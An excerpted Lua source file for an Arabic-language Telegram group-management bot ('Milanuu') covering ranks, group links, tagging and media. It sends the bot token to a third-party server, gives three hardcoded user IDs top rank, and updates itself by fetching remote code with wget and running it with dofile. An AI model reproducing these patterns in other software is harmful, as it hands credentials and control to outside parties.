...
local Milanuu = io.read():gsub(' ','') 
if tostring(Milanuu):match('%d+') then 
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevRio:set(Server.."IdMilanuu",Milanuu) 
end ---ifok
else 
...
Config = {
Milanuu = DevRio:get(Server.."IdMilanuu"),
...
NameBot = (DevRio:get(Milanuu..'Rio:NameBot') or 'ديفد')
--     Source Milanuu     --
...
if user_id == tonumber(Milanuu) then 
var = true 
end 
return var 
end
...
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1558668590) then MilanuuTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1750071859) then MilanuuTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1516553352) then MilanuuTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Milanuu) then MilanuuTEAM = 'البوت' elseif SudoId(user_id) then MilanuuTEAM = 'المطور الاساسي' elseif DevRio:sismember(Milanuu..'Rio:RioSudo:', user_id) then MilanuuTEAM = 'المطور الاساسي' elseif DevRio:sismember(Milanuu..'Rio:SecondSudo:', user_id) then MilanuuTEAM = 'المطور الاساسي²' elseif DevRio:sismember(Milanuu..'Rio:SudoBot:', user_id) then MilanuuTEAM = DevRio:get(Milanuu.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevRio:sismember(Milanuu..'Rio:RioConstructor:'..chat_id, user_id) then MilanuuTEAM = 'المالك' elseif DevRio:sismember(Milanuu..'Rio:Owner:', user_id) then MilanuuTEAM = 'المالك' elseif DevRio:sismember(Milanuu..'Rio:BasicConstructor:'..chat_id, user_id) then MilanuuTEAM = DevRio:get(Milanuu.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevRio:sismember(Milanuu..'Rio:Constructor:'..chat_id, user_id) then MilanuuTEAM = DevRio:get(Milanuu.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevRio:sismember(Milanuu..'Rio:Managers:'..chat_id, user_id) then MilanuuTEAM = DevRio:get(Milanuu.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevRio:sismember(Milanuu..'Rio:Admins:'..chat_id, user_id) then MilanuuTEAM = DevRio:get(Milanuu.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevRio:sismember(Milanuu..'Rio:VipMem:'..chat_id, user_id) then  MilanuuTEAM = DevRio:get(Milanuu.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevRio:sismember(Milanuu..'Rio:Cleaner:'..chat_id, user_id) then  MilanuuTEAM = DevRio:get(Milanuu.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else MilanuuTEAM = DevRio:get(Milanuu.."Rio:mem:Rd"..chat_id) or 'العضو' end return MilanuuTEAM end
--     Source Milanuu     --
...
local url,res = https.request('https://api-Milanuu.ml/Milanuu/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.ChatMember.Milanuu ~= true then
Var = false
...
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://api-Milanuu.ml/Milanuu/MilanuuYt.php?Put=Photo&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&UserId='..data.sender_user_id_..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://api-Milanuu.ml/Milanuu/MilanuuYt.php?Put=Video&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://api-Milanuu.ml/Milanuu/MilanuuYt.php?Put=Audio&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://api-Milanuu.ml/Milanuu/MilanuuYt.php?Put=Voice&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
end
...
if text and text:match('^'..(DevRio:get(Milanuu..'Rio:NameBot') or "ديفد")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevRio:get(Milanuu..'Rio:NameBot') or "ديفد")..' ','')
end
...
tdcli_function({ID="GetUser",user_id_=Milanuu},function(arg,dp) 
local inline = {
...
tdcli_function({ID="GetUser",user_id_=Milanuu},function(arg,chat) 
Dev_Rio(msg.sender_user_id_, msg.id_, 1, '᥀︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "L9L9L")..')', 1, 'md') 
tdcli_function({ID="ForwardMessages",chat_id_=Milanuu,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
SendText(Milanuu,'᥀︙تم ارسال الملصق من ↫ ⤈\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
...
SendText(Milanuu,Text,msg.id_/2097152/0.5,'md') 
...
tdcli_function({ID="GetUser",user_id_=Milanuu},function(arg,result)
...
{{text = '᥀ Milanuu Team .', url="t.me/L9L9L"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
SendText(Milanuu,"᥀︙تم طرد البوت من المجموعه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
...
SendText(Milanuu,"᥀︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙موقعه في المجموعه ↫ "..status.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end end
end,nil)
end,nil)
...
local BotName = (DevRio:get(Milanuu.."Rio:NameBot") or 'ديفد')
...
--     Source Milanuu     --
if text == "الرابط" then
if not DevRio:get(Milanuu..'Rio:Lock:GpLinks'..msg.chat_id_) then 
if DevRio:get(Milanuu.."Rio:Groups:Links"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙Group Link ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..DevRio:get(Milanuu.."Rio:Groups:Links"..msg.chat_id_), 1, "html")
else 
...
--     Source Milanuu     --
if text == "الرابط" then
if not DevRio:get(Milanuu.."Rio:Lock:GpLinksinline"..msg.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or DevRio:get(Milanuu.."Private:Group:Link"..msg.chat_id_) 
...
if text and text == (DevRio:get(Milanuu..'Rio:NameBot') or 'ديفد') then 
NameBot = (DevRio:get(Milanuu..'Rio:NameBot') or 'ديفد')
...
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevRio:del(Milanuu..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع رسائلك', 1, 'md') end
...
ChatLeave(msg.chat_id_, Milanuu)
DevRio:srem(Milanuu.."Rio:Groups",msg.chat_id_)
end
--     Source Milanuu     --
...
Text = [[
Welcome To Source
᥀︙[Milanuu Team](https://t.me/L9L9L)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ Source Channel',url="https://t.me/L9L9L"}},
{{text = '᥀ Developer',url="t.me/tsttt"},{text = '᥀ Tws Milanuu',url="https://t.me/W555Bot"}},{{text= '᥀ Support Source .',url="https://t.me/joinchat/L980Ig8wQnAyN2Vi"}}
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/X6UX6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MilanuuTEAM, 14, string.len(msg.sender_user_id_))
DevRio:del(Milanuu.."Rio:Lock:TagAll")
end
if text == 'تعطيل ملف TagAll.lua' or text == 'تعطيل @all' or text == 'تعطيل all' or text == '↫ تعطيل all ᥀' then   
local MilanuuTEAM = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ملف تاك منفصل للأعضاء'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MilanuuTEAM, 14, string.len(msg.sender_user_id_))
DevRio:set(Milanuu.."Rio:Lock:TagAll",true) 
end 
if text and (text == "all" or text == "@all" or text == "#all") then
if (text and not DevRio:get(Milanuu.."Rio:Lock:TagAll")) then
if DevRio:get(Milanuu.."Rio:TagAll:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevRio:setex(Milanuu..'Rio:TagAll:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MilanuuTEAM, 14, string.len(msg.sender_user_id_))
DevRio:del(Milanuu.."Rio:Lock:TagAdmins")
end
if text == 'تعطيل @admin' or text == 'تعطيل admin' or text == '↫ تعطيل admin ᥀' then   
local MilanuuTEAM = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ملف تاك منفصل للمشرفين'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MilanuuTEAM, 14, string.len(msg.sender_user_id_))
DevRio:set(Milanuu.."Rio:Lock:TagAdmins",true) 
end 
if text == "admin" or text == "@admin" or text == "#admin" then
if (text and not DevRio:get(Milanuu.."Rio:Lock:TagAdmins")) then
if DevRio:get(Milanuu.."Rio:TagAdmins:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevRio:setex(Milanuu..'Rio:TagAdmins:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
--     Source Milanuu     --
if (text and not DevRio:get(Milanuu.."Rio:Lock:AutoFile")) then
Time = DevRio:get(Milanuu.."Rio:AutoFile:Time")
if Time then 
...
Welcomes = DevRio:get(Milanuu..'Rio:Groups:Welcomes'..v) or ''
RioConstructors = DevRio:smembers(Milanuu..'Rio:RioConstructor:'..v)
BasicConstructors = DevRio:smembers(Milanuu..'Rio:BasicConstructor:'..v)
Constructors = DevRio:smembers(Milanuu..'Rio:Constructor:'..v)
Managers = DevRio:smembers(Milanuu..'Rio:Managers:'..v)
Admis = DevRio:smembers(Milanuu..'Rio:Admins:'..v)
Vips = DevRio:smembers(Milanuu..'Rio:VipMem:'..v)
if k == 1 then
...
local curl = 'curl "' .. Rio .. '" -F "chat_id='..Milanuu..'" -F "document=@'..Milanuu..'.json' .. '" -F "caption=᥀︙نسخه تلقائيه تحتوي على ↫ '..#list..' مجموعه"'
io.popen(curl)
io.popen('fm -fr '..Milanuu..'.json')
DevRio:set(Milanuu.."Rio:AutoFile:Time",os.date("%x"))
end
else 
DevRio:set(Milanuu.."Rio:AutoFile:Time",os.date("%x"))
end
...
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevRio:del(Milanuu..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/GifMilanuu/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Milanuu     --
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/MemzMilanuu/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Milanuu     --
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/AudiosMilanuu/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Milanuu     --
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/MilanuuMp3/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Milanuu     --
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/RemixMilanuu/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Milanuu     --
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/PhotosMilanuu/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Milanuu     --
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AnimeMilanuu/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Milanuu     --
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MoviesMilanuu/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Milanuu     --
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SeriesMilanuu/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source Milanuu     --
if Admin(msg) then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MilanuuTEAM, 14, string.len(msg.sender_user_id_))
DevRio:set(Milanuu.."Rio:Lock:Key"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MilanuuTEAM, 14, string.len(msg.sender_user_id_))
DevRio:del(Milanuu.."Rio:Lock:Key"..msg.chat_id_)
return false  
end
end
--     Source Milanuu     --
...
DevRio:set(Milanuu.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(Milanuu,"᥀︙تم تعطيل مجموعه جديده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
...
if not Sudo(msg) then
SendText(Milanuu,"᥀︙هناك من بحاجه الى مساعده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الشخص ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n"..LinkGroup.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
...
local List = DevRio:smembers(Milanuu..'Rio:Manager:GpRed'..msg.chat_id_)
if #List == 0 then
...
local List = DevRio:smembers(Milanuu.."Rio:Sudo:AllRed")
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
...
if text and text:match('^بحث (.*)$') and not DevRio:get(Milanuu.."Rio:WhyTube"..msg.chat_id_) then            
local Text = text:match('^بحث (.*)$') 
local msg_id = msg.id_/2097152/0.5 
https.request('https://api-Milanuu.ml/Milanuu/MilanuuYt.php?Put=Search&TokenBot='..TokenBot..'&ChatId='..msg.chat_id_..'&UserId='..msg.sender_user_id_..'&Text='..URL.escape(Text)..'&MsgId='..msg_id..'&Name='..DirName)
end
--     Source Milanuu     --
if SecondSudo(msg) then
...
os.execute('rm -rf Milanuu.lua') 
os.execute('wget https://raw.githubusercontent.com/MilanuuTEAM/Milanuu/master/Milanuu.lua') 
dofile('Milanuu.lua') 
...
DevRio:set(Milanuu..'Rio:NameBot',(DevRio:get(Milanuu..'Name:Bot') or 'ديفد'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
